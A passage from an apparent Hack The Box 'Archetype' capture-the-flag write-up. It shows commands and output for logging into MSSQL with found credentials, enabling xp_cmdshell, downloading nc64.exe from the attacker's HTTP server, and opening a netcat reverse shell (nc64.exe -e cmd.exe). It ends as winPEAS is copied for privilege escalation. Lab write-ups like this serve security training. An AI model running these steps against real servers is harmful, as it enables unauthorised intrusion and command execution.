</span></span><span class=line><span class=cl>impacket-getTGT             impacket-raiseChild         impacket-ticketConverter
</span></span><span class=line><span class=cl>impacket-GetUserSPNs        impacket-rdp_check          impacket-ticketer
</span></span><span class=line><span class=cl>impacket-goldenPac          impacket-reg                impacket-wmiexec
</span></span><span class=line><span class=cl>impacket-karmaSMB           impacket-registry-read      impacket-wmipersist
</span></span><span class=line><span class=cl>impacket-kintercept         impacket-rpcdump            impacket-wmiquery
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ impacket-
</span></span></code></pre></div><p>Therefore, it will come down to these noteworthy fellows:</p><ul><li>impacket-mssqlclient</li><li>impacket-mssqlinstance</li></ul><p><strong>Checking</strong> them <strong>both</strong> out should make our choice quite easy.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ impacket-mssqlclient --help
</span></span><span class=line><span class=cl>Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright <span class=m>2022</span> Fortra
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>usage: mssqlclient.py <span class=o>[</span>-h<span class=o>]</span> <span class=o>[</span>-port PORT<span class=o>]</span> <span class=o>[</span>-db DB<span class=o>]</span> <span class=o>[</span>-windows-auth<span class=o>]</span> <span class=o>[</span>-debug<span class=o>]</span> <span class=o>[</span>-file FILE<span class=o>]</span>
</span></span><span class=line><span class=cl>                      <span class=o>[</span>-hashes LMHASH:NTHASH<span class=o>]</span> <span class=o>[</span>-no-pass<span class=o>]</span> <span class=o>[</span>-k<span class=o>]</span> <span class=o>[</span>-aesKey hex key<span class=o>]</span>
</span></span><span class=line><span class=cl>                      <span class=o>[</span>-dc-ip ip address<span class=o>]</span>
</span></span><span class=line><span class=cl>                      target
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>TDS client implementation <span class=o>(</span>SSL supported<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>positional arguments:
</span></span><span class=line><span class=cl>  target                <span class=o>[[</span>domain/<span class=o>]</span>username<span class=o>[</span>:password<span class=o>]</span>@<span class=o>]</span>&lt;targetName or address&gt;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>optional arguments:
</span></span><span class=line><span class=cl>  -h, --help            show this <span class=nb>help</span> message and <span class=nb>exit</span>
</span></span><span class=line><span class=cl>  -port PORT            target MSSQL port <span class=o>(</span>default 1433<span class=o>)</span>
</span></span><span class=line><span class=cl>  -db DB                MSSQL database instance <span class=o>(</span>default None<span class=o>)</span>
</span></span><span class=line><span class=cl>  -windows-auth         whether or not to use Windows Authentication <span class=o>(</span>default False<span class=o>)</span>
</span></span><span class=line><span class=cl>  -debug                Turn DEBUG output ON
</span></span><span class=line><span class=cl>  -file FILE            input file with commands to execute in the SQL shell
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>authentication:
</span></span><span class=line><span class=cl>  -hashes LMHASH:NTHASH
</span></span><span class=line><span class=cl>                        NTLM hashes, format is LMHASH:NTHASH
</span></span><span class=line><span class=cl>  -no-pass              don<span class=err>&#39;</span>t ask <span class=k>for</span> password <span class=o>(</span>useful <span class=k>for</span> -k<span class=o>)</span>
</span></span><span class=line><span class=cl>  -k                    Use Kerberos authentication. Grabs credentials from ccache file
</span></span><span class=line><span class=cl>                        <span class=o>(</span>KRB5CCNAME<span class=o>)</span> based on target parameters. If valid credentials cannot
</span></span><span class=line><span class=cl>                        be found, it will use the ones specified in the <span class=nb>command</span> line
</span></span><span class=line><span class=cl>  -aesKey hex key       AES key to use <span class=k>for</span> Kerberos Authentication <span class=o>(</span><span class=m>128</span> or <span class=m>256</span> bits<span class=o>)</span>
</span></span><span class=line><span class=cl>  -dc-ip ip address     IP Address of the domain controller. If ommited it use the domain
</span></span><span class=line><span class=cl>                        part <span class=o>(</span>FQDN<span class=o>)</span> specified in the target parameter
</span></span><span class=line><span class=cl>                       
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span><span class=nv>$impacket</span>-mssqlinstance --help
</span></span><span class=line><span class=cl>Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright <span class=m>2022</span> Fortra
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>usage: mssqlinstance.py <span class=o>[</span>-h<span class=o>]</span> <span class=o>[</span>-timeout TIMEOUT<span class=o>]</span> host
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Asks the remote host <span class=k>for</span> its running MSSQL Instances.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>positional arguments:
</span></span><span class=line><span class=cl>  host              target host
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>optional arguments:
</span></span><span class=line><span class=cl>  -h, --help        show this <span class=nb>help</span> message and <span class=nb>exit</span>
</span></span><span class=line><span class=cl>  -timeout TIMEOUT  timeout to <span class=nb>wait</span> <span class=k>for</span> an answer
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p>Since we already have the <strong>credentials</strong>, let&rsquo;s try and <strong>connect</strong> to it. It is important to note, that without the <em>-windows-auth</em> <strong>optional argument</strong> our connection will not work.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@<span class=nv>$rhost</span> -windows-auth
</span></span><span class=line><span class=cl>Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright <span class=m>2022</span> Fortra
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Encryption required, switching to TLS
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ENVCHANGE<span class=o>(</span>DATABASE<span class=o>)</span>: Old Value: master, New Value: master
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ENVCHANGE<span class=o>(</span>LANGUAGE<span class=o>)</span>: Old Value: , New Value: us_english
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ENVCHANGE<span class=o>(</span>PACKETSIZE<span class=o>)</span>: Old Value: 4096, New Value: <span class=m>16192</span>
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> INFO<span class=o>(</span>ARCHETYPE<span class=o>)</span>: Line 1: Changed database context to <span class=s1>&#39;master&#39;</span>.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> INFO<span class=o>(</span>ARCHETYPE<span class=o>)</span>: Line 1: Changed language setting to us_english.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> ACK: Result: <span class=m>1</span> - Microsoft SQL Server <span class=o>(</span><span class=m>140</span> 3232<span class=o>)</span> 
</span></span><span class=line><span class=cl><span class=o>[</span>!<span class=o>]</span> Press <span class=nb>help</span> <span class=k>for</span> extra shell commands
</span></span><span class=line><span class=cl>SQL&gt; 
</span></span></code></pre></div><blockquote><p>mssqlclient.py</p></blockquote><h2 id=task-5><strong>TASK 5</strong><a hidden class=anchor aria-hidden=true href=#task-5>#</a></h2><p><strong>Question</strong>: <em>What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?</em></p><p>Using the built-in <em><strong>help</strong></em> command in our <strong>authenticated sql session</strong> should shine a light on our answer.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>SQL&gt; <span class=nb>help</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     lcd <span class=o>{</span>path<span class=o>}</span>                 - changes the current <span class=nb>local</span> directory to <span class=o>{</span>path<span class=o>}</span>
</span></span><span class=line><span class=cl>     <span class=nb>exit</span>                       - terminates the server process <span class=o>(</span>and this session<span class=o>)</span>
</span></span><span class=line><span class=cl>     enable_xp_cmdshell         - you know what it means
</span></span><span class=line><span class=cl>     disable_xp_cmdshell        - you know what it means
</span></span><span class=line><span class=cl>     xp_cmdshell <span class=o>{</span>cmd<span class=o>}</span>          - executes cmd using xp_cmdshell
</span></span><span class=line><span class=cl>     sp_start_job <span class=o>{</span>cmd<span class=o>}</span>         - executes cmd using the sql server agent <span class=o>(</span>blind<span class=o>)</span>
</span></span><span class=line><span class=cl>     ! <span class=o>{</span>cmd<span class=o>}</span>                    - executes a <span class=nb>local</span> shell cmd
</span></span><span class=line><span class=cl>     
</span></span><span class=line><span class=cl>SQL&gt;
</span></span></code></pre></div><p>Trying to get some <strong>more information</strong> about what the <em><strong>xp_cmdshell</strong></em> command exactly does is a bust, but it does provide us with some further <strong>hints</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>SQL&gt; xp_cmdshell <span class=nb>help</span>
</span></span><span class=line><span class=cl><span class=o>[</span>-<span class=o>]</span> ERROR<span class=o>(</span>ARCHETYPE<span class=o>)</span>: Line 1: SQL Server blocked access to procedure <span class=s1>&#39;sys.xp_cmdshell&#39;</span> of component <span class=s1>&#39;xp_cmdshell&#39;</span> because this component is turned off as part of the security configuration <span class=k>for</span> this server. A system administrator can <span class=nb>enable</span> the use of <span class=s1>&#39;xp_cmdshell&#39;</span> by using sp_configure. For more information about enabling <span class=s1>&#39;xp_cmdshell&#39;</span>, search <span class=k>for</span> <span class=s1>&#39;xp_cmdshell&#39;</span> in SQL Server Books Online.
</span></span><span class=line><span class=cl>SQL&gt;
</span></span></code></pre></div><p>Breaking it down, it looks like it wanted to <strong>directly run</strong> the <em>help</em> as a command, but it was stopped, because the feature is <strong>not</strong> yet <strong>turned on</strong>. <strong>Enabling</strong> it sounds like a good idea, so let&rsquo;s try it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>enable_xp_cmdshell
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> INFO<span class=o>(</span>ARCHETYPE<span class=o>)</span>: Line 185: Configuration option <span class=s1>&#39;show advanced options&#39;</span> changed from <span class=m>0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> INFO<span class=o>(</span>ARCHETYPE<span class=o>)</span>: Line 185: Configuration option <span class=s1>&#39;xp_cmdshell&#39;</span> changed from <span class=m>0</span> to 1. Run the RECONFIGURE statement to install.
</span></span><span class=line><span class=cl>SQL&gt;
</span></span></code></pre></div><p>Great, it looks like it actually <strong>worked</strong> and we could <strong>turn</strong> it <strong>on</strong>. Let&rsquo;s try and <strong>run</strong> <em><strong>whoami</strong></em> and see if it runs.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>SQL&gt; xp_cmdshell whoami
</span></span><span class=line><span class=cl>output              
</span></span><span class=line><span class=cl>-----------------   
</span></span><span class=line><span class=cl>archetype<span class=se>\s</span>ql_svc   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NULL                
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SQL&gt;
</span></span></code></pre></div><p>Wow, it <strong>worked</strong>. But where are we exactly?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>SQL&gt; xp_cmdshell <span class=nb>echo</span> %cd%
</span></span><span class=line><span class=cl>output                
</span></span><span class=line><span class=cl>-------------------   
</span></span><span class=line><span class=cl>C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NULL                  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SQL&gt; 
</span></span></code></pre></div><p>What else can we run? Can we just <strong>grab</strong> the <strong>user flag</strong> from here directly?</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>SQL&gt; xp_cmdshell <span class=s2>&#34;powershell cat C:\Users\sql_svc\Desktop\user.txt&#34;</span>
</span></span><span class=line><span class=cl>output                             
</span></span><span class=line><span class=cl>--------------------------------   
</span></span><span class=line><span class=cl>&lt;flag&gt;   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NULL                               
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SQL&gt;
</span></span></code></pre></div><p>Actually, we can and we <strong>just did</strong>. But communicating with our <strong>target</strong> this way (via the <strong>interactive sql shell</strong>) is quite cumbersome. So our next course of action should be to get a <strong>reverse shell</strong> on the <strong>target</strong>.</p><p>In a <strong>nutshell</strong>, it could look something like this:</p><ol><li>making <em><strong>netcat</strong></em> binary available on <strong>lhost</strong> (local machine)</li><li>using the <strong>interactive sql terminal</strong> to <strong>download</strong> this binary to the <strong>target</strong> machine</li><li>creating a <em><strong>netcat</strong></em> listener on <strong>lhost</strong></li><li>runing the <em><strong>netcat</strong></em> <strong>binary</strong> on the <strong>target</strong> via the <strong>interactive sql shell</strong> to <strong>connect back</strong> to lhost</li></ol><p>So let&rsquo;s start with <strong>#1</strong>: Our first action should be to download the <em><strong>windows netcat</strong></em> binary (<em>nc64.exe</em>) and <strong>store</strong> it on our local machine.</p><p>Running the <strong>server</strong> module from the <strong>http</strong> <em><strong>pyhton</strong></em> <strong>package</strong> (in the same directory) will start a <strong>local server</strong> and make all the files in that directory <strong>accessible</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ ll
</span></span><span class=line><span class=cl>total 48K
</span></span><span class=line><span class=cl>-rw-r--r-- <span class=m>1</span> htb-bluewalle htb-bluewalle 45K May <span class=m>11</span> 16:20 nc64.exe
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ python -m http.server <span class=m>4444</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>4444</span> <span class=o>(</span>http://0.0.0.0:4444/<span class=o>)</span> ...
</span></span></code></pre></div><p>Continuing with <strong>#2</strong>: We go back to our <strong>interactive sql shell</strong>. Then we try <strong>downloading</strong> the binary using both <em><strong>powershell</strong></em> and <em><strong>wget</strong></em> (previously <strong>alias</strong> for <em><strong>Invoke-WebRequest</strong></em>).</p><p>Our <strong>first attempt</strong> is to download the file (from our current directory) and then <strong>save</strong> it to - C:\Users\sql_svc\Downloads - (where we have write access), but we get an error&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>SQL&gt; xp_cmdshell <span class=s2>&#34;powershell -c wget http://10.10.14.46:4444/nc64.exe -outfile C:\Users\sql_svc\Downloads&#34;</span>
</span></span><span class=line><span class=cl>output                                                                             
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------   
</span></span><span class=line><span class=cl>wget : Access to the path <span class=s1>&#39;C:\Users\sql_svc\Downloads&#39;</span> is denied.                  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>At line:1 char:1                                                                   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>+ wget http://10.10.14.46:4444/nc64.exe -outfile C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>ownl ...        
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~            
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    + CategoryInfo          : NotSpecified: <span class=o>(</span>:<span class=o>)</span> <span class=o>[</span>Invoke-WebRequest<span class=o>]</span>, UnauthorizedAccessException   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    + FullyQualifiedErrorId : System.UnauthorizedAccessException,Microsoft.PowerShell.Commands.InvokeWebRequestCommand   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>                                                                                   
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NULL                                                                               
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SQL&gt;
</span></span></code></pre></div><p>In our <strong>second attempt</strong>, we first <strong>head</strong> to - C:\Users\sql_svc\Downloads - and only after we changed directory, do we try to <strong>download</strong> the binary.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>SQL&gt; xp_cmdshell <span class=s2>&#34;powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.14.46:4444/nc64.exe -outfile nc64.exe&#34;</span>
</span></span><span class=line><span class=cl>output   
</span></span><span class=line><span class=cl>------   
</span></span><span class=line><span class=cl>NULL     
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SQL&gt;
</span></span></code></pre></div><p>This time we are <strong>successful</strong> and our <strong>binary</strong> is located at - C:\Users\sql_svc\Downloads\nc64.exe -.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>SQL&gt; xp_cmdshell <span class=s2>&#34;powershell -c ls C:\Users\sql_svc\Downloads&#34;</span>
</span></span><span class=line><span class=cl>output                                                                             
</span></span><span class=line><span class=cl>--------------------------------------------------------------------------------   
</span></span><span class=line><span class=cl>NULL                                                                               
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NULL                                                                               
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    Directory: C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>ownloads                                          
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NULL                                                                               
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NULL                                                                               
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Mode                LastWriteTime         Length Name                                                                     
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>----                -------------         ------ ----                                                                     
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>-a----        5/11/2023   8:57 AM          <span class=m>45272</span> nc64.exe                                                                 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NULL                                                                               
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NULL                                                                               
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>NULL                                                                               
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>SQL&gt;
</span></span></code></pre></div><p>We <strong>shut down</strong> the <em><strong>http server</strong></em> right after the <strong>download</strong> has finished.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ python -m http.server <span class=m>4444</span>
</span></span><span class=line><span class=cl>Serving HTTP on 0.0.0.0 port <span class=m>4444</span> <span class=o>(</span>http://0.0.0.0:4444/<span class=o>)</span> ...
</span></span><span class=line><span class=cl>10.129.63.163 - - <span class=o>[</span>11/May/2023 16:56:39<span class=o>]</span> <span class=s2>&#34;GET /nc64.exe HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span><span class=line><span class=cl>10.129.63.163 - - <span class=o>[</span>11/May/2023 16:57:33<span class=o>]</span> <span class=s2>&#34;GET /nc64.exe HTTP/1.1&#34;</span> <span class=m>200</span> -
</span></span><span class=line><span class=cl>^C
</span></span><span class=line><span class=cl>Keyboard interrupt received, exiting.
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ 
</span></span></code></pre></div><p>Now for <strong>#3</strong>: It&rsquo;s time to <strong>start</strong> our <strong>listener</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># on lhost</span>
</span></span><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span></code></pre></div><p>Finally (<strong>#4</strong>): We try to <strong>run</strong> the <strong>netcat binary</strong> on the <strong>target</strong> and instruct it to <strong>connect back</strong> to our <strong>local machine</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>SQL&gt; xp_cmdshell <span class=s2>&#34;powershell -c cd C:\Users\sql_svc\Downloads; .\nc64.exe -e cmd.exe 10.10.14.46 4444&#34;</span>
</span></span></code></pre></div><p>No output here. Did it work&mldr;? Once we <strong>head</strong> <strong>over</strong> to the listener from <strong>#3</strong>, we will see that we got a <strong>reverse shell</strong> back. So it actually <strong>worked</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>~/archetype<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ nc -lvnp <span class=m>4444</span>
</span></span><span class=line><span class=cl>Ncat: Version 7.93 <span class=o>(</span> https://nmap.org/ncat <span class=o>)</span>
</span></span><span class=line><span class=cl>Ncat: Listening on :::4444
</span></span><span class=line><span class=cl>Ncat: Listening on 0.0.0.0:4444
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.63.163.
</span></span><span class=line><span class=cl>Ncat: Connection from 10.129.63.163:49680.
</span></span><span class=line><span class=cl>Microsoft Windows <span class=o>[</span>Version 10.0.17763.2061<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=o>(</span>c<span class=o>)</span> <span class=m>2018</span> Microsoft Corporation. All rights reserved.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>ownloads&gt;
</span></span></code></pre></div><p>Let&rsquo;s use our <strong>new</strong> (and much better) <strong>connection</strong> to <strong>grab</strong> the <strong>user flag</strong> (again).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>ownloads&gt;whoami
</span></span><span class=line><span class=cl>whoami
</span></span><span class=line><span class=cl>archetype<span class=se>\s</span>ql_svc
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>ownloads&gt;cd ..<span class=se>\D</span>esktop<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span><span class=nb>cd</span> ..<span class=se>\D</span>esktop<span class=se>\
</span></span></span><span class=line><span class=cl><span class=se></span>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>esktop&gt;dir
</span></span><span class=line><span class=cl>dir
</span></span><span class=line><span class=cl> Volume in drive C has no label.
</span></span><span class=line><span class=cl> Volume Serial Number is 9565-0B4F
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl> Directory of C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>esktop
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>01/20/2020  06:42 AM    &lt;DIR&gt;          .
</span></span><span class=line><span class=cl>01/20/2020  06:42 AM    &lt;DIR&gt;          ..
</span></span><span class=line><span class=cl>02/25/2020  07:37 AM                <span class=m>32</span> user.txt
</span></span><span class=line><span class=cl>               <span class=m>1</span> File<span class=o>(</span>s<span class=o>)</span>             <span class=m>32</span> bytes
</span></span><span class=line><span class=cl>               <span class=m>2</span> Dir<span class=o>(</span>s<span class=o>)</span>  10,711,236,608 bytes free
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>esktop&gt;type user.txt
</span></span><span class=line><span class=cl><span class=nb>type</span> user.txt
</span></span><span class=line><span class=cl>&lt;flag&gt;
</span></span><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\s</span>ql_svc<span class=se>\D</span>esktop&gt;
</span></span></code></pre></div><blockquote><p>xp_cmdshell</p></blockquote><h2 id=task-6><strong>TASK 6</strong><a hidden class=anchor aria-hidden=true href=#task-6>#</a></h2><p><strong>Question</strong>: <em>What script can be used in order to search possible paths to escalate privileges on Windows hosts?</em></p><p>One of the most commonly used <strong>scripts</strong> for <strong>privilege escalation</strong> on windows is <em><strong>winpeas</strong></em>.</p><p>Let bring it over to our <strong>target</strong>. We go through the same motions as before:</p><ul><li>pyhton http server where the file is located at - lhost</li><li>use powershell and wget to copy it over - rhost</li></ul><p>Since <em><strong>winpeas</strong></em> is already downloaded to <em><strong>pwnbox</strong></em>, locating it seems like the only thing still left for us to do. It might take some time, but it can be found at</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>/opt/useful/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/x64/Release/winPEASx64.exe
</span></span></code></pre></div><p>Then, we copy it over to our <em>working</em> directory.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>┌─<span class=o>[</span>eu-starting-point-vip-1-dhcp<span class=o>]</span>─<span class=o>[</span>10.10.14.46<span class=o>]</span>─<span class=o>[</span>htb-bluewalle@htb-9swjmh1jnx<span class=o>]</span>─<span class=o>[</span>/opt/useful/privilege-escalation-awesome-scripts-suite/winPEAS/winPEASexe/binaries/x64/Release<span class=o>]</span>
</span></span><span class=line><span class=cl>└──╼ <span class=o>[</span>★<span class=o>]</span>$ cp winPEASx64.exe ~/archetype/
